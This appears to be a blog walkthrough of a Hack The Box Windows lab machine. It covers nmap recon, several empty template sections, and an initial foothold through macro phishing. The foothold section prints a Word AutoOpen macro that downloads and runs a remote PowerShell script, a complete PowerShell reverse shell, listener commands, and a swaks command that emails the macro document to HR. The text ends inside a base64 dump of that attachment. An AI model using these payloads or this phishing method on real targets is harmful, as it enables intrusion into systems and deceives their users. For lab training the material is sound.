---
title: JobTwo
date: 2026-02-08
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
lastmod: 2026-02-22T08:48:54.644Z
---
# Box Info

JobTwo is a hard-diffculty Windows machine that involves a macro phishing attack for initial foothold. The box has hMailServer installed, which includes a configuration file containing encrypted credentials for the database connection. After extracting the password database, we decrypt the SQL Server Compact database file (SDF), allowing a compromised user who can use WinRM to the machine. The machine has a vulnerable version of Veeam Backup & Replication; the attacker executes a malicious executable under `sqlserver.exe`, which is running as SYSTEM to gain full access.

***

# Recon 10.129.251.205

### \[\[PORT & IP SCAN]]

The `nmap` reveal that the machine is ((change it) a standard Windows AD Server , with the smtp for sending the email , port 80 is nothing base on the observer , and the smb service  open , and the 3389 if for the lateral Movement , and also there are the 443 and the 5985, and the `StorageCraft Image Manager` in 10003 and 6170, finally the box seem like is not the server , like the stand-alone server

```shell
─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.251.205 -oN serviceScan.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-10 13:22 +0800
Nmap scan report for 10.129.251.205
Host is up (0.048s latency).

PORT      STATE SERVICE              VERSION
22/tcp    open  ssh                  OpenSSH for_Windows_9.5 (protocol 2.0)
25/tcp    open  smtp                 hMailServer smtpd
| smtp-commands: JOB2, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
111/tcp   open  rpcbind
135/tcp   open  msrpc                Microsoft Windows RPC
139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=www.job2.vl
| Subject Alternative Name: DNS:job2.vl, DNS:www.job2.vl
| Not valid before: 2023-05-09T13:31:40
|_Not valid after:  2122-05-09T13:41:37
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
1063/tcp  open  rpcbind
2049/tcp  open  rpcbind
3389/tcp  open  ms-wbt-server        Microsoft Terminal Services
| ssl-cert: Subject: commonName=JOB2
| Not valid before: 2025-10-26T11:44:40
|_Not valid after:  2026-04-27T11:44:40
|_ssl-date: 2026-02-10T06:26:11+00:00; +1h00m00s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: JOB2
|   NetBIOS_Domain_Name: JOB2
|   NetBIOS_Computer_Name: JOB2
|   DNS_Domain_Name: JOB2
|   DNS_Computer_Name: JOB2
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-10T06:25:31+00:00
5985/tcp  open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6160/tcp  open  msrpc                Microsoft Windows RPC
6161/tcp  open  msrpc                Microsoft Windows RPC
6162/tcp  open  msrpc                Microsoft Windows RPC
6169/tcp  open  tcpwrapped
6170/tcp  open  storagecraft-image   StorageCraft Image Manager
6190/tcp  open  msrpc                Microsoft Windows RPC
6210/tcp  open  msrpc                Microsoft Windows RPC
6290/tcp  open  unknown
10001/tcp open  msexchange-logcopier Microsoft Exchange 2010 log copier
10002/tcp open  msexchange-logcopier Microsoft Exchange 2010 log copier
10003/tcp open  storagecraft-image   StorageCraft Image Manager
10005/tcp open  stel?
10006/tcp open  netapp-sync?
11731/tcp open  msrpc                Microsoft Windows RPC
49669/tcp open  msrpc                Microsoft Windows RPC
Service Info: Host: JOB2; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-02-10T06:25:33
|_  start_date: N/A
|_clock-skew: mean: 59m59s, deviation: 0s, median: 59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 204.76 seconds

```

found the 2 commonName (which is the Dns resolve) , so need to add into the  `sudo vim /etc/hosts`

```
10.129.251.205 www.job2.vl     JOB2
```

```
sudo vim /etc/hosts
```

### \[\[FTP 21]]

Try the `anonymous` : `anonymous` , and we

```
anonymous : anonymous
```

```
```

### \[\[SMTP & POP 25 ,110]]

Try to collect the username wordlist

```
```

### \[\[SNMP Recon 161,162,10161,10162]]

```
```

### \[\[DNS 53]]

```
netexec smb 10.129.32.246 --generate-hosts-file hosts
sudo vim /etc/host 
```

### \[\[LDAP 389]]

```
```

### \[\[SMB 445]]

we used the account of `guest` to anonymous login , and

```
```

### \[\[NFS 2049]]

```
```

### \[\[Unkown Port]]

```
```

***

### Web Recon 443

Nothing Found

***

### Web Recon http://www.job2.vl/

Found the hr@job2.vl which can added into the wordlist\
![Pasted image 20260210141619.png](/ob/Pasted%20image%2020260210141619.png)

### \[\[WebSite Directory BurteForce]]

```
-dont-filter
200      GET       33l       48w      317c http://www.job2.vl/style.css
200      GET        7l     1513w   144883c http://www.job2.vl/bootstrap.min.css
200      GET      700l     3747w   330856c http://www.job2.vl/boat.jpg
200      GET       44l      189w     1939c http://www.job2.vl/
400      GET        6l       26w      324c http://www.job2.vl/error%1F_log
[####################] - 35s    30003/30003   0s      found:5       errors:0      
[####################] - 34s    30000/30000   886/s   http://www.job2.vl/      
```

### \[\[Exploit-CVE]]  & \[\[Default 404 Pages]]

Show that is the IIS\
![Pasted image 20260210141823.png](/ob/Pasted%20image%2020260210141823.png)

### \[\[git recon]]

```shell
└─#  nmap -p 80 -sCV uat.curryroomhk.com
                                                                    
```

***

### Create Malicious CV by Microsoft Office word  2

![Pasted image 20260210145916.png](/ob/Pasted%20image%2020260210145916.png)

Alt-F11 will open the macro editor. I’ll write an `AutoOpen` function which will run on opening of the document: and save the file type by word macros-enable

![Pasted image 20260210150345.png](/ob/Pasted%20image%2020260210150345.png)

```
Sub AutoOpen()
    Shell "powershell -ep bypass -c ""iex(iwr http://10.10.14.36/shell.ps1 -usebasicparsing)"""
End Sub
```

![Pasted image 20260210150449.png](/ob/Pasted%20image%2020260210150449.png)

create the `shell.ps1`

![Pasted image 20260210150102.png](/ob/Pasted%20image%2020260210150102.png)

```
vim shell.ps1


$LHOST = "10.10.14.36"; $LPORT = 443; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()

```

so now you have 2 files , now start the server

```
└─# ls
My_CV.docm  shell.ps1
```

```
└─# sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
└─# sudo rlwrap -cAr nc -lnvp 443   
listening on [any] 443 ...

```

### send email

```
swaks --to hr@job2.vl --from hay@hay.com --header "Subject: Hire me" --body "Please check the CV " --attach @My_CV.docm  --server 10.129.251.205
```

need to use `--attach @[filename]` so that `bash` will pass the contents of the file to `--attach` (otherwise it just sends the filename as the attachment)

```
└─# swaks --to hr@job2.vl --from hay@hay.com --header "Subject: Hire me" --body "Please check the CV " --attach @My_CV.docm  --server 10.129.251.205
=== Trying 10.129.251.205:25...
=== Connected to 10.129.251.205.
<-  220 JOB2 ESMTP
 -> EHLO kali
<-  250-JOB2
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> MAIL FROM:<hay@hay.com>
<-  250 OK
 -> RCPT TO:<hr@job2.vl>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> Date: Tue, 10 Feb 2026 15:08:11 +0800
 -> To: hr@job2.vl
 -> From: hay@hay.com
 -> Subject: Hire me
 -> Message-Id: <20260210150811.202472@kali>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> MIME-Version: 1.0
 -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_202472"
 -> 
 -> ------=_MIME_BOUNDARY_000_202472
 -> Content-Type: text/plain
 -> 
 -> Please check the CV 
 -> ------=_MIME_BOUNDARY_000_202472
 -> Content-Type: application/octet-stream; name="My_CV.docm"
 -> Content-Description: My_CV.docm
 -> Content-Disposition: attachment; filename="My_CV.docm"
 -> Content-Transfer-Encoding: BASE64
 -> 
 -> UEsDBBQABgAIAAAAIQB+OOx6hwEAAK0FAAATAAgCW0NvbnRlbnRfVHlwZXNdLnhtbCCiBAIooAAC
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC0
 -> lM9OwkAQxu8mvkOzV9MueDDGUDgIHpVEfIBhO4XVdnezO/x7e6e0EDVAVfRCUma+3/fNdju9wbos
 -> oiX6oK1JRTfpiAiNspk2s1S8TB7iWxEFApNBYQ2mYoNBDPqXF73JxmGIWG1CKuZE7k7KoOZYQkis
 -> Q8OV3PoSiB/9TDpQbzBDed3p3EhlDaGhmCqG6PeGmMOioGi05r/rJFNtRHRf91VWqQDnCq2AuCyX
 -> JkvKENs81wqT5RTG3r6iIiEPwjwWoYX2OXLcxE1Yue0Jc+3CFTcccagqxw0a3ROfs9cZRmPw9Agl
 -> d8mV9ZnMrFqUrExOY5qpK0myl5SgvB0ZmBbIVdBml/KoGx/XEAh+YNYoWsmBNgWGb4C/nHb9Hvcj
 -> VSznrcIQ+BqWRVJz2+2RiAX/EaAht0ZY4fT531J8gLcGydl3Ul2Kv4+xR7eGIF4HWP92z86xxZyy
 -> 5E5eAy7wevG/GHv3yVfqmAd26EmfvnV7R0afPR9W2yTD7IC33C7b/jsAAAD//wMAUEsDBBQABgAI
 -> AAAAIQAekRq37wAAAE4CAAALAAgCX3JlbHMvLnJlbHMgogQCKKAAAgAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAArJLBasMwDEDvg/2D0b1R2sEY
 -> o04vY9DbGNkHCFtJTBPb2GrX/v082NgCXelhR8vS05PQenOcRnXglF3wGpZVDYq9Cdb5XsNb+7x4
 -> AJWFvKUxeNZw4gyb5vZm/cojSSnKg4tZFYrPGgaR+IiYzcAT5SpE9uWnC2kiKc/UYySzo55xVdf3
 -> mH4zoJkx1dZqSFt7B6o9Rb6GHbrOGX4KZj+xlzMtkI/C3rJdxFTqk7gyjWop9SwabDAvJZyRYqwK
 -> GvC80ep6o7+nxYmFLAmhCYkv+3xmXBJa/ueK5hk/Nu8hWbRf4W8bnF1B8wEAAP//AwBQSwMEFAAG
 -> AAgAAAAhALIucPEzAwAAXgwAABEAAAB3b3JkL2RvY3VtZW50LnhtbKSXX2+bMBDA3yftOyDeU0OS
 -> EoKaVl3SVn2oFK3r3h1jAqqNke2EZJ9+Z/5vbBWhL7F95n53nO8O5+buxJl1pFIlIl3Z7pVjWzQl
 -> IkzS/cp++/E48W1LaZyGmImUruwzVfbd7dcvN3kQCnLgNNUWIFIV5BlZ2bHWWYCQIjHlWF3xhEih
 -> RKSviOBIRFFCKMqFDNHUcZ1ilklBqFJgb43TI1Z2hSOnYbRQ4hyUDXCOSIylpqeW4V4MuUZL5PdB
 -> 0xEgeMOp20fNLkZ5yHjVA81HgcCrHul6HOkfL+eNI037pMU40qxP8seReunE+wkuMprCZiQkxxqW
 -> co84lu+HbALgDOtkl7BEn4HpeDUGJ+n7CI9AqyHwWXgxYYG4CCmbhTVFrOyDTINKf9LoG9eDUr8a
 -> Gg3KhpkFc0tET5opXevKIbEr1TdVYymihiRlEEeRqjjJmu7Ax9JgM64hx48CcOSsfi7P3IGl9r/W
 -> timPoQUOcb86O85Kzz8mus6A0zSIRmOIC3/arD3hkMGt4VGh6QTXHdh8asC0B/AIHfixqBl+xUCk
 -> rW7DSQaWVc0pT8Vwkjaw7sAe+LczHUB4uAgxndV+mMGod1gq1GF8Ga4+I2R0scYxVk3RlMRoYCOo
 -> ifMOsUwwJkjTzwyTXha06wZ45p0zzPafK9QnKQ5ZS0s+R3tuW3ZuLk8XsKqC7zYh9TlnXmOcQSfn
 -> JHjep0LiHQOPoHwtqECrOAHzC4lshmJKT4Xc5E81iZiZhAfLtET7Fi6BOxGezZjBxjzIsMTPUEOu
 -> v958e1gs7EIKn1BtpNOZt1g++HCjzAO4cIbfV7bj3N87m+W6EW2lEbqeN3+8b4QbGuED052dwuRW
 -> mkGWww4Vv2tVjAyne9A+YshTmk7eXm0Qo+ph1Op2AB+q5IG+fTlb65/WZGKEutwqWWZbUaK3cuiL
 -> Fe7vX3/BJvRh112a20EeQJm6nj/zjWXzwAs2RC3gc+HO507BSvaxbpc7obXg7ZrRqLMbUxxSsLtw
 -> iphHQujOcn/QxdIpzRHBFEhVhgktnynEcMt/kiYpApakdJtoAl7OvEIJ1e9dTMtUQO0fg9vfAAAA
 -> //8DAFBLAwQUAAYACAAAACEAjR3xixYBAACrAwAAHAAIAXdvcmQvX3JlbHMvZG9jdW1lbnQueG1s
 -> LnJlbHMgogQBKKAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACsk0FOwzAQRfdI3CGaPXFS
 -> oEKoTjcIqTsE4QCOM0kMsR3ZQyG3xyqUpCKtushyvuX/3kj2av2l22iLzitrOKRxAhEaaUtlag6v
 -> +ePVHUSehClFaw1y6NHDOru8WD1jKyhc8o3qfBRajOfQEHX3jHnZoBY+th2acFJZpwWF0dWsE/Jd
 -> 1MgWSbJkbtwB2UFntCk5uE15DVHed3hOt60qJfHByg+NhiYQzCNR2MyHTuFqJA77JA5dwKYVFrMq
 -> UN/iWGA3n8KnR/BaSWe9rSiWVv+Sp4jbQjw5+4aSBuqQxYUyx8jLORencBcHg934E6antr+d06Gy
 -> hnJRtCOPv+iUxM2cEp9YvPx7h6NwL8IOvlj2DQAA//8DAFBLAwQUAAYACAAAACEAM84VccQLAAAA
 -> HgAAEwAAAHdvcmQvdmJhUHJvamVjdC5iaW7sWHtwVNUZP/fuJtksCWxCwBARLhuDIbKbu49sHhBh
 -> 9+5uEkwIEAytRGAfN8niZnfdhwQpugQFWrHFSqmDLSI6PphCDYoTKJ1JHauMD8RHRS0tYKHgjDpW
 -> oVod3P7OvbuwwRAi/tHR+m1+Oed+55x7zvnO97rn4Kt5Rx/qLTpGLqDriIJ8lcgmmWk8JgmJNISw
 -> yeevEolEip34gb5TdBYYkTxDJcoMgJ55FqACsgE1kJPsk5ssf6DvB80jQfyihCMOEkAZJstTpjws
 -> GguNSb0r3VcMRqFPmjYu3HyYUaAez5d5rcRGrEOOGppU8ECp+ak/GoyWvCTPmyrT2+aTTuIjEWKH
 -> FDwkRrqIKMlhuFREWIbaDd0TXcOl+qeoiBoaaHFSAovJHDKPNJNZOAcBqxouYf4BPvfSIwgZA9RQ
 -> wyay/6Zyo+sfyv6pj6A+gNr/SGAUkUIAyQPoUY4GCojsG8aivAIoBMYRukZCrgTGA1cBE4CJAAdM
 -> ArRAMXA1UAJMBq4BSoEpQBlwLTAV0AF6oBzgAQNgBEyAGagALEAlUAVUE3lN01BOB2oJjW2EzABm
 -> AlT3bMk+FA7UnUAdUA80JNu+r8SMVRDmY2wyBxrwJsp3GVmRR+P5S6oVRFYS09a9ZtryMB7W4fkZ
 -> 1BnJlGjvVDl8AxhIGiKrIFU/qnrnlsdQJaS1biIr5JAkT9/kSF9M6r+82CPJ58L/eaZCtZslLVpa
 -> pyJu0ZyrJXlony7XUqtnYBMGMhu+KgxP5SJ+2MLFPJgsLDqeYbbSd8VlPeaSXJ7ymK9nbrT+Y9Im
 -> WSq1xpw8PZvell5Ppwt5qX6UFNLhyrRRdjhSO7VQWi4hdG8D8kvJegeb92L8dKJ8+iZZdkP1lNtY
 -> sgHtnx947OYR0JBvQV+9yGCr2lWq84nzKpWyjci6qwSf7r2TpA6GavUmJd0SIXvIXBIKLhPDkU7R
 -> 7+d0YohzLw+5IhFO5+G0PrG71LcszHVGo6Ga8nIDr6d/Zr3JUi7114ciBk4Xi4huV8TnCbnCEV+g
 -> Y4qWWGfyLAMFoWE+kdAkZ05ZFcQ0ppdYo9Gwzx2LEpFrtS2e7YIKcbWcdn4n9Moe9MS6xIAmqs1V
 -> q9fbXBGGXW+YHQx3ufysflxrnT/odvknMdtbQi4P43e6VP6ImLNNCIsuTdTl9o+ZOCcscl7R43eR
 -> zAZvHtkyPxzLtTm6Q6pgRCwYP1/sChG/KyraxbCPvXXM1UIsEg125fhuu1NYbWiJuTlijUWDzSEx
 -> wJVOyVVzhLR0EiofLWSlgrB6MqikSEpUBLKShEVS0popi4thzBoqLbYQoiIpWZGUsDgqLW38aUdA
 -> 6eVITS4NesOgl127qedKZCN4UhxXntd0Bu6MJRxTBmuqIysQr+jPCJgR5Z2IZTKHH1ATvsZL/5kR
 -> 3VYiWpph+UaU1YBAajDDHPiEIOnAfxd8AIf3++AfRHiGNvQIgteF/4ELWppQ90gjI0C7lAm2QEFd
 -> 4InEix5yfpIqKzGvIfnkkJ7spBG/YnCoF4pJXolDK0QrvZvOR/0VDpKE8PNLXBdmokoZQK90KhpE
 -> WtVAxbeSVhXWWYmSH5a0BpNJM8p2iS+iB22jWXPbAL4Bs9HRLWQB+PMgGT3KRsiieNB3LpDk4kWN
 -> jtRjdXQeN1mKd3mkHo0Y5ZbWeGFevo8MplWmC6TzTeVklFaRLqcFWEEAawySZZJsWrCOCNYmQmom
 -> 9G+Tnmg7lR4dH0XNjfF05w7p1GPgUf07f+bplC/tRBgQ1QbjbYN3TiUApee0xAgpO3G+dmkXAvZX
 -> AXk7MasOUuUBG2o2tDvO6ZAVP3nX5iTfeG73VcPWkm9jU83o70RuKWD281rTnGZNl9LBy9EZBt4o
 -> k+QjAhUgJIwFClEvQjke0CajPO1J/8vR8GIxM9V36HaEuAErkMm0FTNfNG8pwJ5M2JsbO6iU9urC
 -> ySQSJezFxyQSNDmVSLqUUqYWxjAce+lF/j8TFdile323SbNo39Z/rb+/6YFJe3bWbzrVR3lyeiin
 -> nnFJcwqZfJLJ7MeXplK5IBj27r5ZQxTKVpv1s/c0JEO5wBcwWP50e7JqMmbdkaxazN130J5NLs9T
 -> uzQYjCGWHcXJWuVO1FTKOeHgUtETNaiv0JBMZSTqDfrF+5ZoSFaqRbdTQ3KUSLlSGVd0+hYNycbS
 -> EgoFWey41eWPIU0qfAfjiZx/HXkb9TtVUofm9nafRxwTo3OlXrD0DTwl21NJ1DtlWDVSKGRQrYc0
 -> hKUmQm8bhhagTBxL7xpkP1HC0pRW5peySIASI1l6E6OR1KmMVRKaZNKbAka6H/g6BaIRbc1C5mxv
 -> nJFuHhSEL2PZDdkkVJBZryA9LPEeVyrxNTieJEWUMZdeCcxkCzLZgtodrDqL9TMFqsz8bDY/Lnur
 -> HHZW/nRWPZYwYYhYAxlfx46jASoVoeaQXLiQkkVEgQBSt4LneSP/pNnE6yA2pUDUCnYkk8/zZstK
 -> hAM9X8wXC4gDOGRvcBlce8vySFTsMimNbQrRqI/6EeeaGx0chBsPdrmivmCALFEQdrVDPqAMVOKC
 -> FMDmxp0jCRfPy44zZVPbBEW+OnNbvEtFrKsnSUd3Z0eznbTHqXfv6diSEZ+4sWdS3QqjHbHNzpsF
 -> XQWCmlVn4A023Qab3VER77Ba42KROZ5hXNcR39sRRoDinD6/GGmbKQS7uoIBZSZiiCccjATbERZa
 -> Ol1h0YvI43Q2CA4DQk5TS7Pe3ujFjOFBz2d4RD9o0nXk0iMIIiu0InlZN/DWaxlE9c2o4DLmF4h8
 -> r0Tp8m7dzhNMSPo0pxcXw53fDiwbLDBeJn3T/adTY2bxWs3qJs5g0fMqrtm96h9co8/9ZNgVXh4v
 -> iZNRPbetY8joZxnT1nE2kaTcU5y6lzpS2J/dM7+/XYrI/fXrEJFnNiAg9wfKig6MML47Ynw/TH97
 -> vY0x2H7KxLdMsLEOJmPqs5P2mrU21bUZNkZjY0KnSrwz3tl65b4tp4N3H1q45+0/vndD7fh9a0q1
 -> BkNcO5u80DizfXxG3vqW172H9/cx+3YenKValPXB5N7tE6paDzWmO8whL3NbchbWPfKXVV2qx9/X
 -> nRy98dHnD5RfE7uuosFeq11RZXMYjQajBVZm4HVmi1Chs1ZWWHUmh8UumIyC1e60rMT3b2qi2vRZ
 -> yyfX80nKVePbWazVJv0VRtSL/pAQDETF7iidiQerFd+scBQw0hA8htsvmoy1WlO1yWg04hXoIDTV
 -> 1Wrtgt2BmZ0mi91isqaDrmOODT2cdrvJIFSZKgGbUC0DrXVCrdZhdPC8INh5h+CgcBrQkKteWB+M
 -> RDlHd1QMeMUw1xBoD96Uqz63AUPtClOVyWi3mHmd4KzmdQaD4NRVOcwmHc9beaHaYOD5CuvKaa02
 -> x7T0bePNiJg3R0Iuj4gXpoun1miZylFUVFVM5cyVqN2Yq669evlr008GOvR3HHl8zSH3JzXaT9uP
 -> Cub7tl31ecktuT+rvuWVse4Tn71RdGTR6Q9HjVu844Mz47bfY3E+yzI7VmcF7l/1sl29pntp358P
 -> 72ma8+HuzbvPvrJnU8nOE3vXnlCcvPGx37745Iaju3f1x57e8MQS0rE5v/yuFyaX/OSjDbf3/f2e
 -> PzjCo+7yz/jRP3/ZFZz00M5Tz93guOHhCV9c+YvX1zxy7G/3bPz9Y71LTpzdWFN90/HfPfOZMC1x
 -> ttu75tiDexJnOoTo6ddGHLQuP2qrOWgo3F/Q+3bdsd6PZySigc2fLi5pmXdvo2Zb56OqVzc9sSq6
 -> 3jLxpP+ju956cMGKrKeeev/a/ocV1S83j1r0m7NzR03kdgT1yiNL1O+PePpA1c+Nd48tPZNX9RY7
 -> 1VPUc3DW9c/vOPZA/elHu4sbXm84/sWE5/S39fxb+WXvupu+OKoVM7vNOX1v5u06VbJ/Px85oL53
 -> z5jm8l0ft914zDTi8JTM6X3k+etHbSwqK/zV/L/6z/QfWvvrl872NS/tsPvK1689ms0c8JCrqrKK
 -> CmKbwvf9J2H4LwAAAP//AwBQSwMEFAAGAAgAAAAhANBVdpIsBwAADSIAABUAAAB3b3JkL3RoZW1l
 -> L3RoZW1lMS54bWzsWluPGzUUfkfiP1jznmZmcq+aolwp7W672t0W8ehknBk3nvHIdnY3QkioPPGC
 -> hASIB5B44wEhkEAC8cKPqdSKy4/A9kwm48RDKd2iCu1G2vjynePP5xwfn0xy442LmIAzxDimSd/x
 -> rrkOQMmcBjgJ+87902mt6wAuYBJAQhPUd9aIO2/cfP21G/C6iFCMgJRP+HXYdyIh0uv1Op/LYciv
 -> 0RQlcm5BWQyF7LKwHjB4LvXGpO67brseQ5w4IIGxVHtvscBzBE6VSufmRvmEyH+J4GpgTtiJUo0M
 -> CY0Nlp5642s+IgycQdJ35DoBPT9FF8IBBHIhJ/qOq/+c+s0b9UKIiArZktxU/+VyuUCw9LUcC2eF
 -> oDvxu02v0K8BROzjJl31KvRpAJzP5U4zLmWs12q7XT/HlkBZ06K71/EaJr6kv7Gvv9ce+k0Dr0FZ
 -> s7m/x2lvMm4ZeA3Kmq09/MD1h72GgdegrNnewzcng44/MfAaFBGcLPfR7U63287RBWRByS0rvNdu
 -> u51xDt+i6qXoyuQTURVrMXxI2VQCtHOhwAkQ6xQt4FziBqmgHIwxTwlcOyCFCeVy2PU9TwZe0/WL
 -> l7Y4vI5gSTobmvO9IcUH8DnDqeg7t6VWpwR58vPPjx/9+PjRT48/+ODxo+/AAQ4jYZG7BZOwLPfH
 -> 1x//+eX74Pcfvvrjk0/teF7GP/32w6e//Pp36oVB67Pvn/74/ZPPP/rtm08s8AGDszL8FMeIg7vo
 -> HBzTWG7QsgCaseeTOI0gLksMkpDDBCoZC3oiIgN9dw0JtOCGyLTjAybThQ345uqhQfgkYiuBLcA7
 -> UWwADyklQ8qse7qj1ipbYZWE9sXZqow7hvDMtvZox8uTVSrjHttUjiJk0Dwi0uUwRAkSQM3RJUIW
 -> sXcwNux6iOeMcroQ4B0MhhBbTXKKZ0Y0bYVu4Vj6ZW0jKP1t2ObwARhSYlM/RmcmUp4NSGwqETHM
 -> +CZcCRhbGcOYlJEHUEQ2kidrNjcMzoX0dIgIBZMAcW6TucfWBt07UOYtq9sPyTo2kUzgpQ15ACkt
 -> I8d0OYpgnFo54yQqY9/iSxmiEBxRYSVBzROi+tIPMKl09wOMDHc/+2zfl2nIHiBqZsVsRwJR8zyu
 -> yQIim/IBi40UO2DYGh3DVWiE9gFCBJ7DACFw/y0bnqaGzbekb0cyq9xCNtvchmasqn6CuKyVVHFj
 -> cSzmRsieoJBW8Dlc7ySeNUxiyKo0312aITOZMXkYbfFK5ksjlWKmDq2dxD0eG/ur1HoUQSOsVJ/b
 -> 43XNDP/9kzMmZR7+Cxn03DIysf9j25xCYiywDZhTiMGBLd1KEcP9WxF1nLTYyiq3MA/t1g31naIn
 -> xskzKqD/rvKR9cWTL760YC+n2rEDX6TOqUolu9VNFW63phlRFuBXv6QZw1VyhOQtYoFeVTRXFc3/
 -> vqKpOs9XdcxVHXNVx9hFXkIdsy1d9AOgzWMerSWufOazwISciDVBB1wXPVye/WAqB3VHCxWPmNJI
 -> NvPlDFzIoG4DRsXbWEQnEUzlMp5eIeS56pCDlHJZOOlhq241QVbxIQ3yJ3iqwtJPNaUAFNtxt1WM
 -> yyJNZKPtzvYRaKFe90L9mHVDQMk+D4nSYiaJhoVEZzP4DBJ6Z5fComdh0VXqK1not9wr8nICUD0Q
 -> bzUzRjLcZEgHyk+Z/Ma7l+7pKmOa2/Yt2+sprpfjaYNEKdxMEqUwjOTlsTt8yb7ubV1q0FOm2KfR
 -> 6b4MX6skspMbSGL2wLni1FF65jDtOwv5iUk241Qq5CpVQRImfWcuckv/m9SSMi7GkEcZTE9lBoix
 -> QAwQHMtgL/uBJCVyPXloXlVyvnLCq0ZOv5W9jBYLNBcVI9uunMuUWGdfEKw6dCVJn0TBOZiRFTuG
